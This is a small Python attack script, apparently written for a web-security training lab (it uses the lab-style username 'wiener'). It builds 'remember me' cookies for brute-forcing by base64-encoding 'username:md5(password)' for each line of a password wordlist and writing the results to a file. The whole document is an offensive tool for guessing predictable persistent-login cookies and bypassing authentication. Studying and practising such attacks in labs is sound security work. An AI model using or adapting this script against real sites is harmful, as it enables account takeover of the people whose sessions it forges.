#!/usr/bin/env python3
# Created by https://github.com/WafflesExploit
import base64
import hashlib

passwordFile = "passwds.txt" # Name of the file that contains passwords to use.
username = "wiener" # Username to use.


print("\n\n"+"---"*5+"Remember me Cookie Generator"+"---"*5)
print(f"Using passwords from: {passwordFile}")
print(f"Using username: {username}")
prompt = input("Press any key to continue...")


def MD5Hash(strToHash):
    result_bytes = hashlib.md5(strToHash.encode())
    return result_bytes.hexdigest()

with open(f'{passwordFile}') as f: # Opens and automatically closes the passwordfile.
    lines = f.readlines()

def EncodeInBase64(text):
    text_bytes = text.encode("ascii")  
    base64_bytes = base64.b64encode(text_bytes)
    base64_string = base64_bytes.decode("ascii")
    return base64_string

# Just to test
# print("Hash: "+MD5Hash('peter'))
# print(EncodeInBase64(f"{username}:{MD5Hash('peter')}"))
with open("cookies_list.txt", "w+") as file:
    for words in lines:
        pass_text = (words[0:len(words)-1])
        strToWrite = EncodeInBase64(f"{username}:{MD5Hash(pass_text)}")
        file.write(strToWrite+"\n")

print(f"Created {len(lines)} cookies in cookies_list.txt")
